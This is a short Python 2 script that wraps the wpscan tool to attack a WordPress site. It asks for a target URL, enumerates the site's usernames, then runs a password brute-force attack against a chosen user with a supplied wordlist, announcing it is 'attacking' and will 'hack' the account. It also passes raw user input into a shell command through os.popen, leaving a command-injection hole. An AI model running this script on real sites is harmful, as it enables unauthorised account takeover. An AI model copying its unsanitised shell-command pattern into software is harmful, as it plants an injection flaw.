import os

url = ""

def get_wpscan(options):
    command = "wpscan --url " + url + " " + options
    process = os.popen(command)
    result = process.read()
    return result


def is_valid(wlist):
    try:
        f = open(wlist , "r")
    except:
        return False
    return True


def interact():
    global url

    #user chooses the url
    url = raw_input("Enter the wordpress site URL :\t")
    print("\n[+] Attacking the website ")
    print("[+] Enumerating user names ")
    print(get_wpscan("--enumerate u"))

    #user enters user to hack
    user = raw_input("Enter the username which you want to hack [BRUTE FORCE]")
    wlist = raw_input("Enter the wordlist path that contains passwords: ")

    if is_valid(wlist):
       print(get_wpscan("-u " + user + " --wordlist " + wlist))
    else:
        print("[-] Invalid file name !!")
        print("[-] Aborting ... ")
        quit()
    print("[+] Connecting to the servers ")

    return
